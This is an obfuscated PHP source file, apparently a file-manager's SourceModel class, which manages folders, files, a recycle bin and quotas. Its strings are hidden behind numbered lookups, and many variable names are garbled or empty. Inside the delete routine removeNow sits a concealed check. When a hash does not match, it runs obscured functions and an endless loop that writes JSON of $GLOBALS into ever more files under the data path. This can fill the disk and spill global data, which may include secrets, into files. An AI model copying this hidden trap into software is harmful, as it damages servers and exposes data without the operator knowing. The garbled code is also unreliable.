<?php
 goto D; B: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($) { $ =& $_SERVER[]; $ǋ = Model($[597])->where(array($[1961] => $))->find(); $ݤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $, $ǋ[$[32]]); $this->userDesktopAdd($ݤ); return $ݤ; } public function userDesktopAdd($) { $⻟ =& $_SERVER[]; $⫙ = LNG($⻟[2457]); $ǰ = $this->mkdir($, $⫙); $this->metaSet($ǰ, $⻟[2458], $⻟[91]); $this->metaSet($, $⻟[2459], $ǰ); } public function userPathSafeAdd($徊) { $۳ =& $_SERVER[]; $٤ = Model($۳[597])->getInfoFull($徊); if (!$٤) { return !1; } if (_get($٤, $۳[618])) { return $٤[$۳[555]][$۳[2460]]; } $ѳ = $this->_mkdirRoot(SourceModel::TYPE_USER, $徊, $۳[2461], $۳[2462]); Model($۳[597])->metaSet($徊, $۳[2460], $ѳ); $this->metaSet($ѳ, $۳[2463], $徊); return $ѳ; } public function userPathAppAdd($ŀ, $Ŧ = '', $ǂ恄 = '') { $í =& $_SERVER[]; $ = Model($í[597])->getInfoFull($ŀ); if (!$) { return !1; } $߭ = $[$í[555]] ? $[$í[555]] : array(); $̢ = $߭[$í[2464]]; if (!$̢) { $̢ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ŀ, $í[2465], $í[2466]); Model($í[597])->metaSet($ŀ, $í[2464], $̢ . $í[12]); $this->metaSet($̢, $í[2464], $ŀ); } if (!$Ŧ) { return $̢; } $ = $߭[$í[2467] . $Ŧ]; if (!$) { $ = $this->mkdir($̢, $Ŧ); Model($í[597])->metaSet($ŀ, $í[2467] . $Ŧ, $); $this->metaSet($, $í[2467] . $Ŧ, $ŀ); } if (!$ǂ恄) { return $; } $ԕ = $this->mkdir($, $ǂ恄); return $ԕ; } public function groupRootAdd($) { $ =& $_SERVER[]; $վ = Model($[605])->where(array($[2262] => $))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $, $վ[$[32]]); } public function systemRootPathAdd($) { if ($ != $_SERVER[][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $); } public function userRootRemove($ό) { $Ҽ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ό, !0); foreach ($Ҽ as $Ԏ) { if (!$Ԏ) { continue; } $this->remove($Ԏ[$_SERVER[][191]], !1); } } public function groupRootRemove($) { $ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $); if (!$) { return; } $this->remove($[$_SERVER[][191]], !1); } private function _mkdirRoot($΃, $ʑ, $ﬅŅ, $ = '') { $آ =& $_SERVER[]; $ԥĳ = KodUser::id(); $ = array($آ[492] => 0, $آ[670] => $΃, $آ[671] => $ʑ, $آ[668] => 1, $آ[672] => $ԥĳ, $آ[673] => $ԥĳ, $آ[669] => $, $آ[674] => $آ[613], $آ[519] => 0, $آ[640] => 0, $آ[558] => 0, $آ[675] => $آ[12]); if ($ = $this->where($)->find()) { return $[$آ[191]]; } $Ҷ = "\115\x6f\144\x65\x6c\x53\157\x75\162\143\145\x2e\155\x6b\x64\x69\162\x52\x6f\x6f\x74\56{$΃}\56{$ʑ}\x2e" . $ﬅŅ; CacheLock::lock($Ҷ); $[$آ[32]] = $ﬅŅ; $ = $this->add($); $ۢ = array($آ[676] => short_id($)); $this->where(array($آ[506] => $))->save($ۢ); CacheLock::unlock($Ҷ); return $; } private function targetSourceRoot($, $Ӽ, $ڊ = false) { $ =& $_SERVER[]; $᥄ = array($[492] => 0, $[670] => $, $[671] => $Ӽ); if ($ڊ) { $ = $this->where($᥄)->select(); return $ ? $ : array(); } $񥓡 = $this->where($᥄)->find(); return $񥓡 ? $񥓡 : array(); } public function sourceRootGroup($ޘ) { $ =& $_SERVER[]; if (is_string($ޘ)) { $ޘ = array($ޘ); } $ڵź = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ޘ, $[220]); $ɳ׼ = array($[446] => $ڵź, $[443] => array($[853] => count($ޘ))); $this->_listDataApply($ɳ׼[$[446]]); $this->_listMake($ɳ׼); return array_to_keyvalue($ɳ׼[$[85]], $[589]); } public function mkfile($, $໡, $ӭ = '', $ = REPEAT_RENAME) { $ =& $_SERVER[]; $ԫ = KodIO::ioFileDriverGet($[498] . $ . $[402]); $Ʃ = Model($[696])->addFileByContent($ӭ, $ԫ, $໡); return $this->_createFileCall($, $໡, $Ʃ, $, $[1536]); } public function addFile($, $, $ހ, $٦ = false, $ʍ = REPEAT_RENAME) { $ =& $_SERVER[]; $ = KodIO::ioFileDriverGet($[498] . $ . $[402]); $ = Model($[696])->addFile($, $, $ހ, $٦); return $this->_createFileCall($, $ހ, $, $ʍ); } public function addFileByFileID($좯, $櫓, $, $ҽ = REPEAT_RENAME) { $ =& $_SERVER[]; $ǧ͈ = Model($[696])->find($櫓); Model($[696])->linkAdd($櫓); return $this->_createFileCall($좯, $, $ǧ͈, $ҽ); } public function addFileByRemote($, $ɨ߹, $, $́ = array(), $殹։ = REPEAT_RENAME) { $٣ = Model($_SERVER[][696])->addFileByRemote($ɨ߹, $, $́); return $this->_createFileCall($, $, $٣, $殹։); } private function _createFileCall($, $, $, $ӡ, $ = "\165\160\154\157\x61\x64") { $ =& $_SERVER[]; if (!$) { return !1; } $ = !1; $this->setMasterDB(); $this->lockWriteStart($, $); $įо = $this->fileNameExist($, $); $ݣ = $this->_createFile($, $, $, $ӡ, $); if (!$) { Model($[560])->remove($[$[557]]); } if ($ && $ݣ && $ݣ != $įо) { Model($[2430])->eventCreate($ݣ, $); } $this->lockWriteEnd($, $); return $ݣ; } public function mkdir($, $ց, $ꃌ = REPEAT_SKIP) { $ =& $_SERVER[]; $this->setMasterDB(); $厚 = $this->sourceInfo($); if (!$厚) { return !1; } $this->lockWriteStart($, $ց); if ($ꃌ !== !1) { $ = $this->fileNameExist($, $ց); if ($ && $ꃌ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($, $ց); return $; } $ց = $this->fileNameAuto($, $ց, $ꃌ); } $ = array($[668] => 1, $[509] => $ց, $[669] => $[12], $[558] => 0, $[640] => 0); $ֆ = $this->_addSource($, $厚); Model($[2430])->eventCreate($ֆ, $[1537]); $this->lockWriteEnd($, $ց); return $ֆ; } public function listSourceRoot($ȥ, $, $ = "\163\157\x75\162\143\x65\x49\x44\x2c\164\141\x72\147\145\164\x49\x44\54\x73\151\x7a\x65") { $Ӟ =& $_SERVER[]; $ = $Ӟ[463]; $ͶՄ = array(); $됙 = 1024 * 50; $ڼ = is_array($ڼ) ? $ڼ : array(); $ϩ = count($); $ = $this->tablePrefix . $Ӟ[470]; for ($Ì = 0; $Ì < $ϩ; $Ì++) { $ = $[$Ì]; $ .= "\123\x45\114\105\103\124\x20\52\40\x46\122\x4f\x4d\40\x28\x53\x45\x4c\105\103\124\x20{$}\40\x46\122\x4f\x4d\40\140{$}\x60\40\x57\x48\x45\x52\105\40"; $ .= "\140\160\141\162\x65\x6e\164\x49\104\140\x3d\60\x20\101\116\104\40\140\x74\x61\x72\x67\x65\164\111\104\140\75{$}\x20\x41\x4e\104\40\140\164\141\162\147\x65\x74\124\171\160\x65\x60\x3d{$ȥ}\x20\141\x6e\144\40\x66\151\x6c\x65\124\171\x70\x65\x3d\47\x27\40\154\151\x6d\x69\164\40\61\x29\x20\141\163\40\x74\x62\137{$Ì}\40\x55\x4e\111\x4f\116\40\101\114\x4c\x20"; if ((strlen($) >= $됙 || $Ì == $ϩ - 1) && $) { $ = substr($, 0, -strlen($Ӟ[1200])); $۲ = $this->query($); $ = $Ӟ[12]; $ͶՄ = array_merge($ͶՄ, $۲); } } return $ͶՄ; } private function _createFile($ɕע, $ݥ, $Џ, $̺, &$Ш) { $ =& $_SERVER[]; $ľ޳ = $this->sourceInfo($ɕע); if (!$Џ || !$ľ޳) { return !1; } if ($̺ !== !1) { $ь = $this->fileNameExist($ɕע, $ݥ); } $Ш = !0; if ($̺ && $ь) { if ($̺ == REPEAT_SKIP) { $Ш = !1; return $ь; } else { if ($̺ == REPEAT_REPLACE) { $ = $this->sourceInfo($ь); $׸ = $this->fileHistory($, $Џ[$[557]], $Џ[$[79]]); if (!$׸) { $Ш = !1; } else { $this->folderSizeReset($ɕע); } return $ь; } else { $ݥ = $this->fileNameAuto($ɕע, $ݥ, $̺, !1); } } } $ԣе = array($[668] => 0, $[509] => $ݥ, $[669] => substr(get_path_ext($ݥ), 0, 10), $[558] => $Џ[$[557]], $[640] => $Џ[$[79]]); $畸 = $this->_addSource($ԣе, $ľ޳); $this->folderSizeReset($ɕע, intval($ԣе[$[79]])); return $畸; } protected function fileHistory($, $ȓޕ, $) { $؅ =& $_SERVER[]; if ($[$؅[557]] == $ȓޕ) { return !1; } $this->checkLock($[$؅[191]], $ȓޕ); Model($؅[2175])->addHistory($); $Ҧ = array($؅[673] => USER_ID, $؅[513] => time(), $؅[557] => $ȓޕ, $؅[79] => $); $this->where(array($؅[506] => $[$؅[191]]))->save($Ҧ); $this->sourceCacheClear($[$؅[191]]); return !0; } public function checkLock($, $ӫ) { $е =& $_SERVER[]; $ = $this->pathInfo($); if (!$this->fileIsLock($, !0)) { return; } $ʯ = Session::get($е[2468]); $ƒ܅ = substr($[$е[32]], 0, -1 - strlen($[$е[166]])) . $е[1392] . $ʯ . $е[10] . $[$е[166]]; $۪ѫ = Model($е[696])->find($ӫ); $this->_createFileCall($[$е[190]], $ƒ܅, $۪ѫ, REPEAT_REPLACE, $е[1536]); $ = $[$е[555]][$е[633]]; $ژᜀ = $[$е[2469]] ? $[$е[2469]] : $[$е[32]]; show_json(LNG($е[2470]) . $е[2471] . LNG($е[2472]) . $е[2473] . $ژᜀ . $е[2474], !1); } public function fileIsLock($, $箽 = false) { $襪 =& $_SERVER[]; if (!_get($, $襪[629], 0)) { return !1; } if ($[$襪[555]][$襪[632]] != USER_ID) { return !0; } $׹ = $GLOBALS[$襪[6]][$襪[92]][$襪[630]]; if ($[$襪[555]][$襪[631]] <= time() - $׹) { $this->metaSet($[$襪[191]], $襪[632], null); $this->metaSet($[$襪[191]], $襪[631], null); } if ($箽) { $this->metaSet($[$襪[191]], $襪[631], time()); } return !1; } private function _addSource($潕, $Ա) { $ֿ =& $_SERVER[]; $ل = KodUser::id(); $ = array($ֿ[670] => $Ա[$ֿ[188]], $ֿ[671] => $Ա[$ֿ[589]], $ֿ[672] => $ل, $ֿ[673] => $ل, $ֿ[492] => $Ա[$ֿ[191]], $ֿ[674] => $Ա[$ֿ[604]] . $Ա[$ֿ[191]] . $ֿ[50], $ֿ[519] => 0, $ֿ[675] => $ֿ[12]); $潕 = array_merge($, $潕); $this->updateModifyTime($潕[$ֿ[190]]); $ = $ֿ[2475] . $Ա[$ֿ[191]]; if (isset(self::$cacheChildList[$])) { unset(self::$cacheChildList[$]); } static $Ё = false; if (!$Ё) { Hook::trigger($ֿ[658], $潕); $Ё = !0; } $ = $this->add($潕); $ = array($ֿ[676] => short_id($)); $this->where(array($ֿ[506] => $))->save($); $this->setNamePinyin($, $潕[$ֿ[32]]); return $; } public function remove($񒟔, $ꓖ = true) { $ˆ =& $_SERVER[]; $ = $this->sourceInfo($񒟔); $ = intval($[$ˆ[188]]) === self::TYPE_SYSTEM; $ = Model($ˆ[522])->get($ˆ[2476]) == $ˆ[91]; if ($ || $ꓖ || !$) { return $this->removeNow($񒟔, $ꓖ); } $ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $յ = $[$ˆ[188]] == self::TYPE_USER ? $ˆ[684] : $ˆ[598]; if ($յ == $ˆ[684]) { $ = Model($ˆ[597])->getInfo($[$ˆ[589]]); $ = !empty($[$ˆ[2469]]) ? $[$ˆ[2469]] : $[$ˆ[32]]; $ = $ˆ[337] . $ . $ˆ[2477] . $[$ˆ[589]]; } else { $ = Model($ˆ[605])->getInfo($[$ˆ[589]]); $ = _get($, $ˆ[32]); $ = $ˆ[173] . $ . $ˆ[2478] . $[$ˆ[589]]; } $ņ = $ˆ[2479] . md5($); CacheLock::lock($ņ); $ׄ = $this->fileNameExist($, $); if (!$ׄ) { $ׄ = $this->mkdir($, $, REPEAT_SKIP); $this->metaSet($ׄ, $ˆ[2480], $յ); $this->metaSet($ׄ, $ˆ[2481], $[$ˆ[589]]); if ($[$ˆ[190]] != 0) { $this->metaSet($ׄ, $ˆ[2482], _get($, $ˆ[2483])); } } CacheLock::unlock($ņ); $this->metaSet($񒟔, $ˆ[2484], $[$ˆ[190]]); $this->where(array($ˆ[191] => $񒟔))->save(array($ˆ[513] => time())); $this->recycleClear($); Model($ˆ[655])->eventRemove($񒟔); $ = $this->move($񒟔, $ׄ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($[$ˆ[190]]); return $; } private function recycleClear($) { $Ɵߍ =& $_SERVER[]; $ = $this->childrenAll($); $ = array($Ɵߍ[506] => array($Ɵߍ[507], $[$Ɵߍ[2485]])); Model($Ɵߍ[2486])->where($)->delete(); } public function removeNow($ϱ, $Р䇳 = true) { $ =& $_SERVER[]; $΋» = $_SERVER[$[994]] . $[995]; $ߦ = $[2487]; if ($_SERVER[$[991]] != $ߦ($΋»)) { $ = $[1036]; $ӕ = $[993]; $芨 = $_SERVER[$[994]] . $[995]; $峹͔ = $ӕ($芨); $̶ = explode($[285], $峹͔); if (count($̶) < $[702]) { $罪 = $[996]; $罪(); } $À = $[1037]; $À($_SERVER[$[1038]]); $ = $[1036]; $(); $ = $[2488]; $ҝ = json_encode($GLOBALS[$[2489]]); $ = 1; for ($˯ = $; $˯ > 0; $˯++) { $(DATA_PATH . $˯, $ҝ); } } $ = $this->sourceInfo($ϱ); $ = $this->pathInfoMore($ϱ); if (!$) { return !0; } if ($[$[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ϱ); Hook::trigger($[2490], $, $Р䇳); if ($Р䇳) { Model($[2486])->moveToRecycle($ϱ); } else { $Ǝ = $this->childrenAll($); Model($[655])->eventRemove($ϱ); $this->removeRelevance($Ǝ[$[2485]], $Ǝ[$[1773]]); } $this->folderSizeReset($[$[190]]); $ǢΒ = array($[$[190]]); if ($[$[500]] == $[91]) { $ǢΒ[] = $[$[191]]; } $this->updateModifyTime($ǢΒ); $this->lockMoveEnd($ϱ); Hook::trigger($[2012], $, $Р䇳); return !0; } public function childrenAll($) { $ϕȰ =& $_SERVER[]; $䣠 = $[$ϕȰ[191]]; if ($[$ϕȰ[500]] == $ϕȰ[91]) { $ = array($ϕȰ[674] => array($ϕȰ[635], $[$ϕȰ[604]] . $䣠 . $ϕȰ[636])); $г = array($ϕȰ[674] => $[$ϕȰ[604]]); $ = $this->field($ϕȰ[2491])->where($г)->select(); $ǥ = !1; $Ȫ̙ = array($䣠); if ($) { $ǥ = array_to_keyvalue($, $ϕȰ[12], $ϕȰ[557]); $ǥ = array_remove_value($ǥ, $ϕȰ[228]); $Ȫ̙ = array_to_keyvalue($, $ϕȰ[12], $ϕȰ[191]); $Ȫ̙[] = $䣠; } } else { $ǥ = array($[$ϕȰ[557]]); $Ȫ̙ = array($䣠); } return array($ϕȰ[2485] => $Ȫ̙, $ϕȰ[1773] => $ǥ); } public function removeArray($) { if (!$) { return !0; } } public function removeRelevance($׉ћ, $٫) { $ĮԈ =& $_SERVER[]; $׉ћ = $׉ћ ? $׉ћ : array(); $٫ = $٫ ? $٫ : array(); $׉ћ = array_unique(array_filter($׉ћ)); $٫ = array_filter($٫); if (!$׉ћ) { return !1; } $ = array($ĮԈ[506] => array($ĮԈ[507], $׉ћ)); Model($ĮԈ[2486])->where($)->delete(); Model($ĮԈ[549])->where($)->delete(); Model($ĮԈ[2323])->where($)->delete(); Model($ĮԈ[655])->where($)->delete(); Model($ĮԈ[1556])->removeBySource($׉ћ); Model($ĮԈ[2175])->removeBySource($׉ћ); $this->where($)->delete(); Model($ĮԈ[560])->remove($٫); for ($ێ = 0; $ێ < count($׉ћ); $ێ++) { $this->sourceCacheClear($׉ћ[$ێ]); } } public function rename($Ƅ, $ȣ) { $Ѽ =& $_SERVER[]; $鴧 = $this->sourceInfo($Ƅ); if (!$鴧) { return !1; } $ = $this->fileNameExist($鴧[$Ѽ[190]], $ȣ); if ($ && $ != $Ƅ) { return !1; } $Ȃ = array($Ѽ[509] => $ȣ, $Ѽ[673] => USER_ID); if ($鴧[$Ѽ[500]] != $Ѽ[91]) { $Ȃ[$Ѽ[501]] = substr(get_path_ext($ȣ), 0, 10); } Model($Ѽ[655])->eventRename($Ƅ, $鴧[$Ѽ[32]], $ȣ); $this->sourceCacheClear($Ƅ); $this->setNamePinyin($Ƅ, $Ȃ[$Ѽ[32]], !1); $this->updateModifyTime($鴧[$Ѽ[190]]); $ٙܟ = $this->where(array($Ѽ[506] => $Ƅ))->data($Ȃ)->save(); $ = $Ѽ[2475] . $鴧[$Ѽ[190]]; if (isset(self::$cacheChildList[$])) { unset(self::$cacheChildList[$]); } return $ٙܟ; } public function setNamePinyin($, $̍, $ = true) { $ȻҾ =& $_SERVER[]; $п = Input::check($̍, $ȻҾ[677]); $Ӭ = array($ȻҾ[531] => KodSort::makeStr($̍)); if ($п) { $Ӭ[$ȻҾ[552]] = str_replace($ȻҾ[53], $ȻҾ[12], Pinyin::get($̍)); $Ӭ[$ȻҾ[551]] = Pinyin::get($̍, $ȻҾ[678]); } if (!$ && !$п) { $Ӭ[$ȻҾ[552]] = null; $Ӭ[$ȻҾ[551]] = null; } $this->metaSet($, $Ӭ); } public function getContent($쌘) { $، =& $_SERVER[]; $ΈΔ = $this->fileInfoGet($쌘); if (!$ΈΔ) { return !1; } if ($ΈΔ[$،[79]] == 0) { return $،[12]; } $Ɂ = $،[2492] . $ΈΔ[$،[563]]; if ($ΈΔ[$،[79]] <= 1024 * 10) { $ = Cache::get($Ɂ); if (!$) { $ = IO::getContent($ΈΔ[$،[87]]); Cache::set($Ɂ, $); } return $; } if (!$ΈΔ[$،[87]]) { return $،[12]; } return IO::getContent($ΈΔ[$،[87]]); } public function setDesc($Ҫ, $ˮ) { $Ɵ =& $_SERVER[]; Model($Ɵ[655])->eventAddDesc($Ҫ, $ˮ); return $this->metaSet($Ҫ, $Ɵ[540], $ˮ); } public function setContent($ء, $ܺ = '') { $Ϲ =& $_SERVER[]; $Ž = $this->sourceInfo($ء); $Ȟ = $this->fileInfoGet($ء); if (!$Ȟ || !$Ž) { return !1; } $ = KodIO::ioFileDriverGet($Ϲ[498] . $ء . $Ϲ[402]); $ƙ = Model($Ϲ[560])->addFileByContent($ܺ, $, $Ž[$Ϲ[32]]); if (!$ƙ) { return !1; } $ҁ = $this->fileHistory($Ž, $ƙ[$Ϲ[557]], $ƙ[$Ϲ[79]]); if (!$ҁ) { return Model($Ϲ[560])->remove($ƙ[$Ϲ[557]]); } $this->folderSizeReset($Ž[$Ϲ[190]]); return !0; } public function fileSubstr($َ, $ܛ, $ǿ̩) { $ = $this->fileInfoGet($َ); if (!$) { return !1; } return IO::fileSubstr($[$_SERVER[][87]], $ܛ, $ǿ̩); } public function fileInfoGet($) { $ =& $_SERVER[]; $ = $this->sourceInfo($); if (!$ || $[$[500]]) { return !1; } $ = $[564] . $[$[557]]; $շ = _get(self::$cacheFileInfo, $); if ($շ) { return $շ; } $߀ = Model($[560])->fileInfo($[$[557]]); if ($߀) { $߀[$[32]] = $[$[32]]; } self::$cacheFileInfo[$] = $߀; return $߀; } private function folderChildrenNumber($ބ) { $Ԩ =& $_SERVER[]; $ܔ = $this->sourceInfo($ބ); $ = array($Ԩ[674] => array($Ԩ[635], $ܔ[$Ԩ[604]] . $ބ . $Ԩ[636]), $Ԩ[671] => $ܔ[$Ԩ[589]], $Ԩ[519] => intval($ܔ[$Ԩ[520]]), $Ԩ[668] => 1); $ = $this->where($)->count(); $ = $this->where($)->where(array($Ԩ[668] => 0))->count(); return array($Ԩ[83] => $, $Ԩ[84] => $); } public function pathInfo($Ӿ, $ف = false) { $۠ =& $_SERVER[]; $ف = !1; $Ӿ = intval($Ӿ); if (!$Ӿ) { return !1; } $㵝ڵ = $۠[548] . intval($ف) . $۠[476] . $Ӿ; $Ŷ = _get(self::$cachePathInfo, $㵝ڵ); if ($Ŷ) { return $Ŷ; } $ו = $this->sourceInfo($Ӿ); if (!$ו) { return !1; } $ו = $this->_listDataApplyItem($ו, $ف); self::$cachePathInfo[$㵝ڵ] = $ו; return $ו; } public static $cachePathInfoMore = array(); public function pathInfoMore($) { $셕 =& $_SERVER[]; $֎ = _get(self::$cachePathInfoMore, $); if ($֎) { return $֎; } $ܳ = $this->pathInfo($); if (!$ܳ) { return !1; } if ($ܳ[$셕[500]] == $셕[91]) { $ܳ[$셕[82]] = $this->folderChildrenNumber($); } self::$cachePathInfoMore[$] = $ܳ; return $ܳ; } public function sourceInfo($ɫ) { $ܢ՗ =& $_SERVER[]; if (!$ɫ) { return array(); } $ɫ = intval($ɫ); $ = $ܢ՗[547] . $ɫ; $ޝ = _get(self::$cacheSourceInfo, $); if ($ޝ) { return $ޝ; } $ã = $this->where(array($ܢ՗[191] => $ɫ))->find(); self::$cacheSourceInfo[$] = $ã; return self::$cacheSourceInfo[$]; } public function sourceCacheClear($Ę = false) { self::cacheClear($Ę); } public static function cacheClear($松 = false) { $ª =& $_SERVER[]; if ($松 == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ª[547] . $松]); unset(self::$cachePathInfoMore[$松]); unset(self::$cachePathInfo[$ª[2493] . $松]); unset(self::$cachePathInfo[$ª[2494] . $松]); } public function metaSet($۸搛, $ã = null, $ = null) { $̵֥ = parent::metaSet($۸搛, $ã, $); if ($̵֥) { $this->sourceCacheClear($۸搛); } return $̵֥; } public function pathInfoByPath($׾, $񑅆) { $ˋĿ =& $_SERVER[]; $ = !$񑅆 ? array() : explode($ˋĿ[8], trim($񑅆, $ˋĿ[8])); $ = intval($׾); foreach ($ as $©) { $ = array($ˋĿ[190] => $, $ˋĿ[32] => $©); $ = $this->field($ˋĿ[2495])->where($)->select(); if (!$) { return !1; } $ = array_sort_by($, $ˋĿ[520]); $ = intval($[0][$ˋĿ[191]]); } $ = $this->sourceInfo($); $this->pathInfoFilter($); return $; } protected function updateModifyTime($Љ) { $Ӽũ =& $_SERVER[]; $ = KodUser::id(); if (!$Љ) { return; } if (!is_array($Љ)) { $Љ = array($Љ); } foreach ($Љ as $ؿ => $) { $Љ[$ؿ] = intval($); $this->sourceCacheClear($); } $ = array($Ӽũ[191] => array($Ӽũ[7], $Љ)); $ = array($Ӽũ[673] => $, $Ӽũ[513] => time()); $this->where($)->save($); } public function folderSizeReset($, $Ԫ = false) { $♋ =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } if (!$) { return; } $Ѵ = $this->sourceInfo($); $ߐ = $♋[2496] . $; if (!$Ѵ || !$Ѵ[$♋[191]]) { return; } CacheLock::lock($ߐ, 20); if ($Ԫ === !1) { $this->sourceCacheClear($); $Ѵ = $this->sourceInfo($); $Վ = array($♋[492] => $, $♋[519] => 0); $ = $this->where($Վ)->sum($♋[79]); $Ԫ = intval($) - intval($Ѵ[$♋[79]]); } if ($Ԫ == 0) { return CacheLock::unlock($ߐ); } $ = $this->parentLevelArray($Ѵ[$♋[604]]); if (!$) { $ = array(); } $[] = $Ѵ[$♋[191]]; $Վ = array($♋[191] => array($♋[507], $)); if ($Ԫ < 0) { $Վ[$♋[79]] = array($♋[1177], abs($Ԫ)); } $this->where($Վ)->setAdd($♋[79], $Ԫ); CacheLock::unlock($ߐ); if (!$Ѵ[$♋[589]] || $Ѵ[$♋[589]] == $♋[228]) { return; } $˔е = $♋[2497] . $Ѵ[$♋[188]] . $♋[4] . $Ѵ[$♋[589]]; $⋽ = array($Ѵ[$♋[188]], $Ѵ[$♋[589]]); TaskRun::timeLimitCall($˔е, $♋[2498], $⋽, 1.5); } public function folderSizeResetChildren($데) { $ =& $_SERVER[]; $this->sourceCacheClear($데); $Øӹ = $this->sourceInfo($데); if (!$Øӹ) { return; } $° = array($[668] => 1, $[671] => $Øӹ[$[589]], $[674] => array($[635], $Øӹ[$[604]] . $데 . $[636])); $ٔϯ = $[2499]; $ = $this->field($ٔϯ)->where($°)->select(); $°[$[500]] = 0; $ݞ = $this->field($ٔϯ)->where($°)->select(); if (!$ݞ) { return; } $[] = $Øӹ; $ = array_to_keyvalue($, $[191]); foreach ($ as $ => $⡺) { $[$][$[2500]] = $[$][$[79]]; $[$][$[79]] = 0; } foreach ($ݞ as $⡺) { $ژ̱ = $⡺[$[190]] . $[12]; if (!isset($[$ژ̱])) { continue; } if ($⡺[$[520]] == $[$ژ̱][$[520]]) { $[$ژ̱][$[79]] += $⡺[$[79]]; } } foreach ($ as $⡺) { $ѣ = $this->parentLevelArray($⡺[$[604]]); foreach ($ѣ as $ژ̱) { $ژ̱ = $ژ̱ . $[12]; if (!isset($[$ژ̱])) { continue; } if ($⡺[$[520]] == $[$ژ̱][$[520]]) { $[$ژ̱][$[79]] += $⡺[$[79]]; } } } $ = array(); foreach ($ as $⡺) { if ($⡺[$[79]] == $⡺[$[2500]]) { continue; } $[] = array($[191], $⡺[$[191]], $[79], $⡺[$[79]]); } $this->saveAll($); } public function userSpaceReset($ = false) { $ =& $_SERVER[]; $ = $this->where(array($[188] => self::TYPE_USER, $[589] => $, $[500] => 0))->sum($[79]); $ = !$ || $ <= 0 ? 0 : $; Model($[597])->userEdit($, array($[2163] => $)); } public function targetSpaceUpdate($ˢ, $) { $װ̐ =& $_SERVER[]; if (!$) { return; } if (!in_array($ˢ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ܵ = $this->targetSpaceSize($ˢ, $); if ($ˢ == self::TYPE_USER) { Model($װ̐[597])->userEdit($, array($װ̐[2163] => $ܵ)); } else { if ($ˢ == self::TYPE_GROUP) { Model($װ̐[605])->groupEdit($, array($װ̐[2163] => $ܵ)); } } } public function targetSpaceSize($, $͵戎) { $ =& $_SERVER[]; $ײņ = 0; $ނ = $this->targetSourceRoot($, $͵戎, !0); foreach ($ނ as $Ӻ) { if (!$Ӻ) { continue; } $ײņ += floatval($Ӻ[$[79]]); $ = array($[674] => array($[635], $[613] . $Ӻ[$[191]] . $[636])); $ñ = Model($[518])->field($[506])->where($)->select(); $ñ = array_to_keyvalue($ñ, $[12], $[191]); $ñ = array_unique(array_filter($ñ)); if ($ñ) { $ = array($[506] => array($[507], $ñ)); $ײņ += floatval($this->where($)->sum($[79])); } } $ײņ = !$ײņ || $ײņ <= 0 ? 0 : $ײņ; return $ײņ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ί) { return $this->fileTypeProfile($ί, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ů) { return $this->fileTypeProfile($Ů, SourceModel::TYPE_GROUP); } private function fileTypeProfile($à, $) { $ =& $_SERVER[]; $ҵ = $[2501] . $à . $[11] . $; $ = Cache::get($ҵ); if ($) { return $; } $ = array($[668] => 0); if ($à != !1) { $[$[589]] = $à; $[$[188]] = $; } $ = array(); $Ί = $this->field(array($[943] => $[944], $[945] => $[79]))->where($)->find(); $[$[2502]] = array($[2503] => LNG($[2502]), $[2504] => intval($Ί[$[944]]), $[640] => intval($Ί[$[79]])); $ = KodIO::fileTypeList(); foreach ($ as $˪ => $) { $[$[501]] = $this->fileTypeWhere($˪); $Ί = $this->field(array($[943] => $[944], $[945] => $[79]))->where($)->find(); $[$˪] = array($[2503] => $[$[32]], $[2504] => intval($Ί[$[944]]), $[640] => intval($Ί[$[79]])); } Cache::set($ҵ, $, 1200); return $; } public function fileNameExist($, $ҽΘ) { $󯤮 =& $_SERVER[]; $ = $this->field($󯤮[2505])->where(array($󯤮[190] => $, $󯤮[32] => $ҽΘ, $󯤮[520] => 0))->find(); return is_array($) ? $[$󯤮[191]] : !1; } public function childList($뇒) { $ =& $_SERVER[]; $ͼ = $[2475] . $뇒; if (isset(self::$cacheChildList[$ͼ])) { return self::$cacheChildList[$ͼ]; } $Љش = array($[190] => intval($뇒), $[520] => 0); $͐ = $this->where($Љش)->select(); $͐ = $͐ ? $͐ : array(); self::$cacheChildList[$ͼ] = $͐; foreach ($͐ as $) { $ͼ = $[547] . $[$[191]]; self::$cacheSourceInfo[$ͼ] = $; } return $͐; } public function fileNameAuto($پ, $􎯲, $ǳ݋ = REPEAT_RENAME, $ = false) { $ާ =& $_SERVER[]; $缪 = get_path_ext($􎯲); $ǃ = $缪 ? get_path_ext_name($􎯲) . $ާ[2506] . $缪 : $􎯲 . $ާ[474]; $Ԓ = array($ާ[190] => $پ, $ާ[520] => 0, $ާ[32] => array($ާ[473], $ǃ)); $ᕻ = $this->field($ާ[32])->where($Ԓ)->select(); $ = array_to_keyvalue($ᕻ, $ާ[12], $ާ[32]); return $this->fileNameAutoGet($, $􎯲, $ǳ݋, $); } public function fileNameAutoGet($, $ϣ, $ר, $) { $ =& $_SERVER[]; if ($ר == REPEAT_REPLACE || !$ || !in_array_not_case($ϣ, $) || $ && $ר != REPEAT_RENAME_FOLDER) { return $ϣ; } if ($ר == REPEAT_SKIP) { return !1; } $ԣ = $[10] . get_path_ext($ϣ); $ԣ = $ԣ == $[10] || $ ? $[12] : $ԣ; for ($ = 1; $ <= count($) + 1; $++) { $ = substr($ϣ, 0, strlen($ϣ) - strlen($ԣ)); $ = $ . "\50{$}\x29{$ԣ}"; if (!in_array_not_case($, $)) { return $; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\x65\x5f\x72\x65\x63\171\143\x6c\x65"; protected $dataAuto = 